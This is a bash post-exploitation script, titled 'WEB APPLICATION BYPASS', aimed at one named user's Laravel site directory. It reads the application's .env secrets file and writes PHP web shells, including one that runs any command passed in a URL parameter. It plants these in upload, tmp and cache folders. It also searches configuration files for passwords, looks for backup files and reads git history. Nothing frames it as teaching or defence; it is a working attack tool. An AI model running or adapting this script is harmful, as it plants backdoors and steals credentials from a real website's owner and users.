#!/bin/bash
echo "=== WEB APPLICATION BYPASS ==="
echo ""

TARGET_DIR="/home/keshavduac/public_html/Keshav/public"

echo "[1] Laravel Specific Exploitation..."
# Check if it's a Laravel application
if [ -f "$TARGET_DIR/../artisan" ]; then
    echo "Laravel application detected!"
    
    # Try Laravel artisan commands
    php $TARGET_DIR/../artisan --version 2>/dev/null
    
    # Try to exploit Laravel .env
    ENV_FILE="$TARGET_DIR/../.env"
    if [ -f "$ENV_FILE" ]; then
        echo "Found .env file, attempting read..."
        cat "$ENV_FILE" 2>/dev/null | head -10
    fi
    
    # Try storage directory
    STORAGE_DIR="$TARGET_DIR/../storage"
    if [ -d "$STORAGE_DIR" ]; then
        echo "Storage directory: $STORAGE_DIR"
        find "$STORAGE_DIR" -type f -name "*.php" 2>/dev/null | head -5
    fi
fi

echo ""
echo "[2] File Upload Bypass..."
# Create various file upload bypass attempts
cat > /tmp/shell.phtml << 'EOF'
<script language="php">system("id");</script>
EOF

cat > /tmp/shell.php5 << 'EOF'
<?php system($_GET['c']); ?>
EOF

cat > /tmp/shell.phar << 'EOF'
<?php echo "PHAR test"; ?>
EOF

# Try to copy to upload directories
find "$TARGET_DIR" -type d -name "*upload*" -o -name "*tmp*" -o -name "*cache*" 2>/dev/null | while read dir; do
    cp /tmp/shell.phtml "$dir/shell_$$.phtml" 2>/dev/null && echo "Uploaded to: $dir/shell_$$.phtml"
    cp /tmp/shell.php5 "$dir/shell_$$.php5" 2>/dev/null && echo "Uploaded to: $dir/shell_$$.php5" 
done

echo ""
echo "[3] Configuration File Manipulation..."
# Find config files
find "$TARGET_DIR/.." -name "*.php" -type f -exec grep -l "config\\|database\\|password" {} \; 2>/dev/null | head -10

echo ""
echo "[4] Backup File Discovery..."
# Look for backup files
find "$TARGET_DIR/.." -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null | head -10

echo ""
echo "[5] Git Exploitation..."
# Check for .git directory
if [ -d "$TARGET_DIR/../.git" ]; then
    echo "Git repository found!"
    # Try to extract sensitive info from git
    cd "$TARGET_DIR/.." && git log --oneline 2>/dev/null | head -5
    git status 2>/dev/null
fi

echo ""
echo "=== WEB BYPASS COMPLETE ==="